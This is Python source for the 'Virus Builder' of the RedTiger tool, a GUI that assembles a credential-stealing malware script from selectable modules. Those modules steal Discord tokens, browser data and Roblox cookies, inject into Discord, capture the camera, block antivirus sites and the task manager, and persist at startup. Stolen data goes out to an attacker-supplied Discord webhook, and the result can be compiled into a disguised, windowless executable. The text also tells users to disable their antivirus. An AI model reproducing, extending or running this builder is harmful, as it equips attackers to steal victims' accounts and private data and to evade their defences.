# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import random
    import os
    import subprocess
    import shutil
    import tkinter as tk
    import time
    import json
    from tkinter import filedialog
    from tkinter import ttk
    from tkinter import messagebox
    import sys
except Exception as e:
    ErrorModule(e)

Title("Virus Builder")

try:
# ╔═══════════════════════════File detected by the antivirus, but be aware that there is no backdoor═══════════════════════════╗
# ║                                                                                                                            ║
    from FileDetectedByAntivirus.VirusBuilderOptions import *                                                                # ║
    disinfect_path = os.path.join(tool_path, "Settings", "Program", "FileDetectedByAntivirus", "VirusBuilderDisinfect.py")   # ║
# ║                                                                                                                            ║ 
# ╚═══════════════════════════File detected by the antivirus, but be aware that there is no backdoor═══════════════════════════╝

    def disinfect():
        try:
            if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, disinfect_path, None, 1) <= 32:
                raise ctypes.WinError()
            print(f"{red}[{white}{current_time_hour()}{red}] {INFO} Disinfection is successfully.")
        except Exception as e:
            print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Error during disinfection: {white}{e}")

    def choose_icon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tk.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])

            elif sys.platform.startswith("linux"):
                icon_path = filedialog.askopenfilename(title="Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        except:
            pass

    def convert_to_exe(file_python, path_destination, name_file, icon_path=None):
        
        
        if sys.platform.startswith("win"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            os.system("python -m pip uninstall pathlib")
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            os.system("python -m pip install --upgrade pyinstaller")
        elif sys.platform.startswith("linux"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            os.system("python3 -m pip3 uninstall pathlib")
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            os.system("python3 -m pip3 install --upgrade pyinstaller")

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable: {reset}")

        try:
            script_path = os.path.abspath(file_python)

            pyinstaller = ['pyinstaller', '--onefile', '--distpath', path_destination, '--noconsole', script_path]

            if icon_path:
                pyinstaller.extend(['--icon', icon_path])

            subprocess.run(pyinstaller)

            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful. The executable is located in the folder: {white + path_destination_relative}")
        
            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
                shutil.rmtree(os.path.join(tool_path, "build"))
                os.remove(os.path.join(tool_path, f"{name_file}.spec"))
                os.remove(file_python)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + e}")
        
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + e}")

    def webhook_send(webhook):
        try:
            fields = [
                {"name": f"File Name:", "value": f"""```{name_file}```""", "inline": True},
                {"name": f"File Type:", "value": f"""```{file_type}```""", "inline": True},
                {"name": f"System Info:", "value": f"""```{add_system}```""", "inline": True},
                {"name": f"Discord Token:", "value": f"""```{add_discord}```""", "inline": True},
                {"name": f"Discord Injection:", "value": f"""```{add_discordinjection}```""", "inline": True},
                {"name": f"Browser Steal:", "value": f"""```{add_browser}```""", "inline": True},
                {"name": f"Roblox Cookie:", "value": f"""```{add_roblox}```""", "inline": True},
                {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
                {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
                {"name": f"Open UserProfil:", "value": f"""```{add_openuserprofilsettings}```""", "inline": True},
                {"name": f"Block Key:", "value": f"""```{add_blockkey}```""", "inline": True},
                {"name": f"Block Mouse:", "value": f"""```{add_blockmouse}```""", "inline": True},
                {"name": f"Block Task Manager:", "value": f"""```{add_blocktaskmanager}```""", "inline": True},
                {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
                {"name": f"Shutdown:", "value": f"""```{add_shutdown}```""", "inline": True},
                {"name": f"Spam Open Program:", "value": f"""```{add_spamopenprograms}```""", "inline": True},
                {"name": f"Spam Create File:", "value": f"""```{add_spamcreatefile}```""", "inline": True},
                {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
                {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
                {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
                {"name": f"Anti VM & Debug:", "value": f"""```{add_antivmanddebug}```""", "inline": True},
                {"name": f"Webhook:", "value": f"""{webhook}""", "inline": True},
            ]

            embed = {
                'title': f'Virus Created:',
                'color': color_webhook,
                "fields": fields,
                'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                }
            
            response = requests.post(webhook, data=json.dumps({
                'embeds': [embed],
                'username': username_webhook,
                'avatar_url': avatar_webhook
                }), headers={'Content-Type': 'application/json'})

            if response.status_code == 404:
                return "Invalid"
            else:
                return "Valid"
        except:
            return "Invalid"

    Slow(virus_banner)

    if sys.platform.startswith("linux"):
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} On Linux, the builder does not work very well.")
        choice = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Do you still want to continue ? (y/n) -> {reset}")
        if not choice in ['y', 'Y', 'Yes', 'yes', 'YES']:
            Reset()

    Slow(f"""{BEFORE + current_time_hour() + AFTER} {INFO} File detected by the antivirus, but be aware that there is no backdoor!  
{BEFORE + current_time_hour() + AFTER} {INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
{BEFORE + current_time_hour() + AFTER} {INFO} Deactivate your antivirus so that no files are deleted after your build.
{BEFORE + current_time_hour() + AFTER} {INPUT} Builder:""")
    
    # <<<<<<<<<< Logs >>>>>>>>>>
    def error_logs(message):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {message}")
        messagebox.showerror(f"RedTiger {version_tool} | Virus Builder", message)

    def info_logs(message):
        messagebox.showinfo(f"RedTiger {version_tool} | Virus Builder", message)

    # <<<<<<<<<< Windows & Settings >>>>>>>>>>
    root = tk.Tk()
    style = ttk.Style()
    if sys.platform.startswith("win"):
        root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
    root.title(f'{name_tool} {version_tool} | Virus Builder')
    if sys.platform.startswith("win"):
        width_window = 1030
        height_window = 750
    elif sys.platform.startswith("linux"):
        width_window = 1200
        height_window = 800

    root.geometry(f"{width_window}x{height_window}")
    root.resizable(False, False)

    red_color = '#a80505'
    text_color = '#a80505'
    fly_color = "#ff0000"
    background_color = "#000000"
    lock_color = "#660000"

    root.configure(background=background_color)
    style.theme_use('default')

    # <<<<<<<<<< Title >>>>>>>>>>
    text_title = tk.Label(root, text="Virus Builder", font=("Calibri", 35, "bold"), background=background_color, foreground=text_color)
    text_title.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))
    text_github = tk.Label(root, text=github_tool, font=("Calibri", 12), background=background_color, foreground=text_color)
    text_github.grid(row=1, column=0, columnspan=2, sticky="n", padx=(140, 20))

    # <<<<<<<<<< Webhook Entry >>>>>>>>>>
    if sys.platform.startswith("win"):
        def on_entry_focus_in(event):
            if webhook_entry.get() == "Discord Webhook URL":
                webhook_entry.delete(0, "end")
                webhook_entry.config(foreground=text_color, highlightcolor=fly_color)

        def on_entry_focus_out(event):
            if webhook_entry.get() == "":
                webhook_entry.insert(0, "Discord Webhook URL")
                webhook_entry.config(foreground=text_color, highlightcolor=fly_color)

    webhook_entry = tk.Entry(root, background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5, font=("Calibri", 12))
    webhook_entry.grid(row=2, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
    webhook_entry.insert(0, "Discord Webhook URL")

    if sys.platform.startswith("win"):
        webhook_entry.bind("<FocusIn>", on_entry_focus_in)
        webhook_entry.bind("<FocusOut>", on_entry_focus_out)
        root.grid_columnconfigure(0, weight=0) 
        webhook_entry.config(width=60)

    # <<<<<<<<<< Select Options >>>>>>>>>>
    fake_error_title = "Microsoft Excel"
    fake_error_message = "The file is corrupt and cannot be opened."
    fake_error_window_status = True

    def create_fake_error_window():
        global fake_error_window_status
        if fake_error_window_status == True:
            fake_error_window_status = False
            pass
        elif fake_error_window_status == False:
            fake_error_window_status = True
            return
        
        fake_error_window = tk.Toplevel(root)
        fake_error_window.title(f"RedTiger {version_tool} | Fake Error")

        if sys.platform.startswith("win"):
            fake_error_window.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
        fake_error_window.geometry(f"300x180")
        fake_error_window.resizable(False, False)

        fake_error_window.configure(background=background_color)
        style.theme_use('default')

        def on_title_focus_in(event):
            if fake_error_title_entry.get() == "Error Title":
                fake_error_title_entry.delete(0, "end")
                fake_error_title_entry.config(foreground=text_color, highlightcolor=fly_color)

        def on_title_focus_out(event):
            if fake_error_title_entry.get() == "":
                fake_error_title_entry.insert(0, "Error Title")
                fake_error_title_entry.config(foreground=text_color, highlightcolor=fly_color)

        def on_message_focus_in(event):
            if fake_error_message_entry.get() == "Error Message":
                fake_error_message_entry.delete(0, "end")
                fake_error_message_entry.config(foreground=text_color, highlightcolor=fly_color)

        def on_message_focus_out(event):
            if fake_error_message_entry.get() == "":
                fake_error_message_entry.insert(0, "Error Message")
                fake_error_message_entry.config(foreground=text_color, highlightcolor=fly_color)

        fake_error_title_entry = tk.Entry(fake_error_window, background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5, font=("Calibri", 12))
        fake_error_title_entry.grid(row=0, column=0, padx=10, pady=20, sticky="ew")
        fake_error_title_entry.insert(0, "Error Title")
        fake_error_title_entry.config(width=34)

        fake_error_message_entry = tk.Entry(fake_error_window, background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5, font=("Calibri", 12))
        fake_error_message_entry.grid(row=1, column=0, padx=10, pady=10, sticky="ew")
        fake_error_message_entry.insert(0, "Error Message")

        if sys.platform.startswith("win"):
            fake_error_title_entry.bind("<FocusIn>", on_title_focus_in)
            fake_error_title_entry.bind("<FocusOut>", on_title_focus_out)
            fake_error_message_entry.bind("<FocusIn>", on_message_focus_in)
            fake_error_message_entry.bind("<FocusOut>", on_message_focus_out)

        def save_error_details():
            global fake_error_title, fake_error_message
            fake_error_title = fake_error_title_entry.get()
            fake_error_message = fake_error_message_entry.get()

            if fake_error_title == "Error Title":
                fake_error_title = "Microsoft Excel"
            if fake_error_message == "Error Message":
                fake_error_message = "The file is corrupt and cannot be opened."
            
            fake_error_window.destroy()
        
        def test_fake_error():
            global fake_error_title, fake_error_message
            fake_error_title = fake_error_title_entry.get()
            fake_error_message = fake_error_message_entry.get()
            if fake_error_title == "Error Title":
                fake_error_title = "Microsoft Excel"
            if fake_error_message == "Error Message":
                fake_error_message = "The file is corrupt and cannot be opened."

            messagebox.showerror(fake_error_title, fake_error_message)
            

        style.configure('CustomButton.TButton', borderwidth=0, background=text_color, font=('Calibri', 15, "bold"), foreground=background_color)
        style.map('CustomButton.TButton', background=[('active', fly_color)])

        build_button = ttk.Button(fake_error_window, text="Save", command=save_error_details, style='CustomButton.TButton', width=8)
        build_button.grid(row=2, column=0, columnspan=2, sticky="w", padx=(40,0))

        disinfect_button = ttk.Button(fake_error_window, text="Test", command=test_fake_error, style='CustomButton.TButton', width=8)
        disinfect_button.grid(row=2, column=0, sticky="e", columnspan=2, padx=(0,40))

    add_system = "Disable"
    add_discord = "Disable"
    add_discordinjection = "Disable"
    add_browser = "Disable"
    add_roblox = "Disable"
    add_cameracapture = "Disable"
    add_openuserprofilsettings = "Disable"
    add_screenshot = "Disable"
    add_blockkey = "Disable"
    add_blockmouse = "Disable"
    add_blocktaskmanager = "Disable"
    add_blockwebsite = "Disable"
    add_shutdown = "Disable"
    add_spamopenprograms = "Disable"
    add_spamcreatefile = "Disable"
    add_fake_error = "Disable"
    add_startup = "Disable"
    add_restart = "Disable"
    add_antivmanddebug = "Disable"
    webhook = "None"
    name_file = "None"
    icon_path = ""

    add_system_var = tk.StringVar(value="Disable")
    add_discord_var = tk.StringVar(value="Disable")
    add_discordinjection_var = tk.StringVar(value="Disable")
    add_browser_var = tk.StringVar(value="Disable")
    add_roblox_var = tk.StringVar(value="Disable")
    add_cameracapture_var = tk.StringVar(value="Disable")
    add_screenshot_var = tk.StringVar(value="Disable")
    add_openuserprofilsettings_var = tk.StringVar(value="Disable")
    add_blockkey_var = tk.StringVar(value="Disable")
    add_blockmouse_var = tk.StringVar(value="Disable")
    add_blocktaskmanager_var = tk.StringVar(value="Disable")
    add_blockwebsite_var = tk.StringVar(value="Disable")
    add_shutdown_var = tk.StringVar(value="Disable")
    add_spamopenprograms_var = tk.StringVar(value="Disable")
    add_spamcreatefile_var = tk.StringVar(value="Disable")
    add_fake_error_var = tk.StringVar(value="Disable")
    add_startup_var = tk.StringVar(value="Disable")
    add_restart_var = tk.StringVar(value="Disable")
    add_antivmanddebug_var = tk.StringVar(value="Disable")
    file_type_var = tk.StringVar(value="Python File")

    style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=text_color)
    style.map('Custom.TCheckbutton', background=[('active', background_color)], foreground=[('active', fly_color), ('disabled', lock_color)])

    transparent_image = tk.PhotoImage(width=1, height=1)
    text_stealeroptions = tk.Label(root, text="Stealer Options:", font=("Calibri", 22), background=background_color, foreground=text_color)
    text_stealeroptions.grid(row=3, column=0, pady=(15, 0), padx=(83, 0))

    add_system_cb = ttk.Checkbutton(root, text="System Info", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_discord_cb = ttk.Checkbutton(root, text="Discord Token", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_discordinjection_cb = ttk.Checkbutton(root, text="Discord Injection", variable=add_discordinjection_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_browser_cb = ttk.Checkbutton(root, text="Browser Steal", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_roblox_cb = ttk.Checkbutton(root, text="Roblox Cookie", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_openuserprofilsettings_cb = ttk.Checkbutton(root, text="Open UserProfil", variable=add_openuserprofilsettings_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', state="disable")

    add_system_cb.grid(row=4, column=0, padx=(220, 20), sticky="w")
    add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
    add_discordinjection_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
    add_browser_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
    add_roblox_cb.grid(row=4, column=1, padx=(0, 0), sticky="w")
    add_cameracapture_cb.grid(row=5, column=1, padx=(0, 0), sticky="w")
    add_screenshot_cb.grid(row=6, column=1, padx=(0, 0), sticky="w")
    add_openuserprofilsettings_cb.grid(row=7, column=1, padx=(0, 0), sticky="w")

    text_malwareoptions = tk.Label(root, text="Malware Options:", font=("Calibri", 22), background=background_color, foreground=text_color)
    text_malwareoptions.grid(row=9, column=0, pady=(15, 0), padx=(103, 0))

    add_blockkey_cb = ttk.Checkbutton(root, text="Block Key", variable=add_blockkey_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_blockmouse_cb = ttk.Checkbutton(root, text="Block Mouse", variable=add_blockmouse_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_blocktaskmanager_cb = ttk.Checkbutton(root, text="[Admin] Block Task Manager", variable=add_blocktaskmanager_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_blockwebsite_cb = ttk.Checkbutton(root, text="[Admin] Block AV Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_shutdown_cb = ttk.Checkbutton(root, text="Shutdown", variable=add_shutdown_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_spamopenprograms_cb = ttk.Checkbutton(root, text="Spam Open Program", variable=add_spamopenprograms_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_spamcreatefile_cb = ttk.Checkbutton(root, text="Spam Create File", variable=add_spamcreatefile_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', command=create_fake_error_window)
    add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
    add_antivmanddebug_cb = ttk.Checkbutton(root, text="Anti VM & Debug", variable=add_antivmanddebug_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')

    add_blockkey_cb.grid(row=10, column=0, padx=(220, 20), sticky="w")
    add_blockmouse_cb.grid(row=11, column=0, padx=(220, 20), sticky="w")
    add_blocktaskmanager_cb.grid(row=12, column=0, padx=(220, 20), sticky="w")
    add_blockwebsite_cb.grid(row=13, column=0, padx=(220, 20), sticky="w")
    add_shutdown_cb.grid(row=14, column=0, padx=(220, 20), sticky="w")
    add_spamopenprograms_cb.grid(row=15, column=0, padx=(220, 20), sticky="w")
    add_spamcreatefile_cb.grid(row=10, column=1, padx=(0, 0), sticky="w")
    add_fake_error_cb.grid(row=11, column=1, padx=(0, 0), sticky="w")
    add_startup_cb.grid(row=12, column=1, padx=(0, 0), sticky="w")
    add_restart_cb.grid(row=13, column=1, padx=(0, 0), sticky="w")
    add_antivmanddebug_cb.grid(row=14, column=1, padx=(0, 0), sticky="w")

    def openuserprofile_state(*args):
        if add_screenshot_var.get() == "Enable":
            add_openuserprofilsettings_cb.config(state="normal")
            add_openuserprofilsettings_var.set("Enable")
        else:
            add_openuserprofilsettings_var.set("Disable")
            add_openuserprofilsettings_cb.config(state="disabled")

    def blockmouse_state(*args):
        if add_restart_var.get() == "Enable":
            if add_blockmouse_var.get() == "Enable":
                add_blockmouse_var.set("Disable")
                error_logs("The \"Restart\" and \"Block Mouse\" option are not compatible together.")

    def restart_state(*args):
        if add_blockmouse_var.get() == "Enable":
            if add_restart_var.get() == "Enable":
                add_restart_var.set("Disable")
                error_logs("The \"Block Mouse\" and \"Restart\" option are not compatible together.")

        elif add_spamopenprograms_var.get() == "Enable":
            if add_restart_var.get() == "Enable":
                add_restart_var.set("Disable")
                error_logs("The \"Spam Open Program\" and \"Restart\" option are not compatible together.")
        
        elif add_spamcreatefile_var.get() == "Enable":
            if add_restart_var.get() == "Enable":
                add_restart_var.set("Disable")
                error_logs("The \"Spam Create File\" and \"Restart\" option are not compatible together.")

    def spamopenprograms_state(*args):
        if add_restart_var.get() == "Enable":
            if add_spamopenprograms_var.get() == "Enable":
                add_spamopenprograms_var.set("Disable")
                error_logs("The \"Restart\" and \"Spam Open Program\" option are not compatible together.")

    def spamcreatefile_state(*args):
        if add_restart_var.get() == "Enable":
            if add_spamcreatefile_var.get() == "Enable":
                add_spamcreatefile_var.set("Disable")
                error_logs("The \"Restart\" and \"Spam Create File\" option are not compatible together.")

    add_restart_var.trace("w", spamopenprograms_state)
    add_restart_var.trace("w", blockmouse_state)
    add_restart_var.trace("w", spamcreatefile_state)
    add_blockmouse_var.trace("w", restart_state)
    add_spamopenprograms_var.trace("w", restart_state)
    add_spamcreatefile_var.trace("w", restart_state)
    add_screenshot_var.trace("w", openuserprofile_state)

    # <<<<<<<<<< Button Style >>>>>>>>>>
    style.configure('Red.TButton', borderwidth=0, background=text_color, font=('Calibri', 12, "bold"), foreground=background_color)
    style.map('Red.TButton', background=[('active', fly_color)])

    # <<<<<<<<<< File Name Entry >>>>>>>>>>
    if sys.platform.startswith("win"):
        def on_entry_focus_in(event):
            if name_file_entry.get() == "File Name":
                name_file_entry.delete(0, "end")
                name_file_entry.config(foreground=text_color, highlightcolor=fly_color)

        def on_entry_focus_out(event):
            if name_file_entry.get() == "":
                name_file_entry.insert(0, "File Name")
                name_file_entry.config(foreground=text_color, highlightcolor=fly_color)

    name_file_entry = tk.Entry(root, background=background_color, foreground=text_color, relief="flat", highlightbackground=text_color, highlightthickness=1.5, font=("Calibri", 12), width=20)
    name_file_entry.grid(row=40, column=0, padx=(60, 0), pady=(20, 10))
    name_file_entry.insert(0, "File Name")

    if sys.platform.startswith("win"):
        name_file_entry.bind("<FocusIn>", on_entry_focus_in)
        name_file_entry.bind("<FocusOut>", on_entry_focus_out)

    # <<<<<<<<<< Select Icon >>>>>>>>>>
    style.map('Red.TButton', background=[('disabled', lock_color)], foreground=[('disabled', background_color)])

    icon_button = ttk.Button(root, text="Select Icon", command=choose_icon, style='Red.TButton')
    icon_button.grid(row=40, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
    icon_button.config(compound="right")

    if file_type_var.get() == "Python File":
        icon_button.config(state="disabled")

    root.grid_columnconfigure(0, minsize=0) 

    # <<<<<<<<<< Select File Type >>>>>>>>>>
    def file_type_changed(*args):
        if file_type_var.get() == "Python File":
            icon_button.config(state="disabled")
        elif file_type_var.get() == "File Type":
            icon_button.config(state="disabled")
        else:
            icon_button.config(state="normal")

    try:
        file_type_var = tk.StringVar(value="File Type")
        file_type_var.trace_add("write", file_type_changed)
    except:
        pass

    file_type_menu = ttk.OptionMenu(root, file_type_var, *["File Type", "Python File", "Exe File"], style='Red.TButton')
    file_type_menu.grid(row=40, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
    file_type_menu.config(compound="right")

    # <<<<<<<<<< Build Button >>>>>>>>>>
    def Build_Settings():
        global add_system, add_discord, add_discordinjection, add_browser, add_roblox, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_blockkey, add_blockmouse, add_blocktaskmanager, add_blockwebsite, add_spamopenprograms, add_spamcreatefile, add_shutdown ,add_fake_error,  add_startup, add_restart, add_antivmanddebug, webhook, name_file, file_type
        add_system = add_system_var.get()
        add_discord = add_discord_var.get()
        add_discordinjection = add_discordinjection_var.get()
        add_browser = add_browser_var.get()
        add_roblox = add_roblox_var.get()
        add_cameracapture = add_cameracapture_var.get()
        add_openuserprofilsettings = add_openuserprofilsettings_var.get()
        add_screenshot = add_screenshot_var.get()
        add_blockwebsite = add_blockwebsite_var.get()
        add_blockkey = add_blockkey_var.get()
        add_blockmouse = add_blockmouse_var.get()
        add_blocktaskmanager = add_blocktaskmanager_var.get()
        add_shutdown = add_shutdown_var.get()
        add_spamopenprograms = add_spamopenprograms_var.get()
        add_spamcreatefile = add_spamcreatefile_var.get()
        add_fake_error = add_fake_error_var.get()
        add_startup = add_startup_var.get()
        add_restart = add_restart_var.get()
        add_antivmanddebug = add_antivmanddebug_var.get()
        webhook = webhook_entry.get()
        name_file = name_file_entry.get()

        if file_type_var.get() == "Python File":
            file_type = "Python File"
        else:
            file_type = "Exe File"
        
        if not name_file.strip() or name_file in ["File Name"]:
            random_number = random.randint(1, 1000)
            name_file = f'Virus_{random_number}'

        root.quit()
        root.destroy()

    style.configure('CustomButton.TButton', borderwidth=0, background=text_color, font=('Calibri', 15, "bold"), foreground=background_color)
    style.map('CustomButton.TButton', background=[('active', fly_color)])
    
    build_button = ttk.Button(root, text="Build", command=Build_Settings, style='CustomButton.TButton', width=15)
    build_button.grid(row=41, column=0, columnspan=2, pady=(30, 0), padx=(300,0))

    # <<<<<<<<<< Disinfinct Button >>>>>>>>>>
    disinfect_button = ttk.Button(root, text="Self Disinfect", command=disinfect, style='CustomButton.TButton', width=15)
    disinfect_button.grid(row=41, column=0, columnspan=2, pady=(30, 0), padx=(0,80))

    root.mainloop()

    width = 18
    print(f"""
    {add_system          } System Info         {add_openuserprofilsettings} Open UserProfil     {add_spamcreatefile} Spam Create File
    {add_discord         } Discord Token       {add_blockkey              } Block Key           {add_fake_error    } Fake Error
    {add_discordinjection} Discord Injection   {add_blockmouse            } Block Mouse         {add_startup       } Launch at Startup
    {add_browser         } Browser Steal       {add_blocktaskmanager      } Block Task Manager  {add_restart       } Restart Every 5min
    {add_roblox          } Roblox Cookie       {add_blockwebsite          } Block AV Website    {add_antivmanddebug} Anti VM & Debug
    {add_cameracapture   } Camera Capture      {add_shutdown              } Shutdown
    {add_screenshot      } Screenshot          {add_spamopenprograms      } Spam Open Program

    {red}Webhook   : [{white + webhook_send(webhook) + red}] {white + webhook[:90] + '.' * 3}
    {red}File Type : {white + file_type}
    {red}File Name : {white + name_file}""".replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))
    if icon_path:
        if 100 < len(icon_path):
            icon_path_cut = icon_path[:100] + '.' * 3
        else:
            icon_path_cut = icon_path
        print(f"    {red}Icon Path : {white + icon_path_cut}")

    file_python_relative = f'\\1-Output\\VirusBuilder\\{name_file}.py'
    file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")

    path_destination_relative = "\\1-Output\\VirusBuilder"
    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")

    try:
        with open(file_python, 'w', encoding='utf-8') as file:

            if add_antivmanddebug == 'Enable':
                file.write(Ant1VM4ndD3bug)

            file.write(Obligatory.replace("%WEBHOOK_URL%", webhook))

            if add_system == 'Enable':
                file.write(Sy5t3mInf0)

            if add_discord == 'Enable':
                file.write(Di5c0rdT0k3n)

            if add_discordinjection == 'Enable':
                file.write(Di5c0rdIj3ct10n)

            if add_browser == 'Enable':
                file.write(Br0w53r5t341)

            if add_roblox == 'Enable':
                file.write(R0b10xC00ki3)

            if add_cameracapture == 'Enable':
                file.write(C4m3r4C4ptur3)

            if add_openuserprofilsettings == 'Enable':
                file.write(Op3nU53rPr0fi1353tting5)

            if add_screenshot == 'Enable':
                file.write(Scr33n5h0t)

            if add_blockkey == 'Enable':
                file.write(B10ckK3y)
            
            if add_blockmouse == 'Enable':
                file.write(B10ckM0u53)
            
            if add_blocktaskmanager == 'Enable':
                file.write(B10ckT45kM4n4g3r)

            if add_blockwebsite == 'Enable':
                file.write(B10ckW3b5it3)

            if add_fake_error == 'Enable':
                file.write(F4k33rr0r(fake_error_title, fake_error_message))

            if add_spamopenprograms == 'Enable':
                file.write(Sp4m0p3nPr0gr4m)

            if add_spamcreatefile == 'Enable':
                file.write(Sp4mCr34tFil3)

            if add_shutdown == 'Enable':
                file.write(Shutd0wn)

            if add_startup == 'Enable':
                file.write(St4rtup)

            file.write(St4rt)

            if add_spamopenprograms == 'Enable' or add_blockmouse == 'Enable' or add_spamcreatefile == 'Enable':
                file.write(Sp4mOpti0ns)

            if add_restart == 'Enable':
                file.write(R3st4rt)

        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
    except Exception as e:
        print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")

    if file_type in ['Exe File']:
        convert_to_exe(file_python, path_destination, name_file, icon_path)
    
    try:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Open: {white + path_destination_relative}")
        os.startfile(path_destination)
    except: pass

    Continue()
    Reset()
except Exception as e:
    Error(e)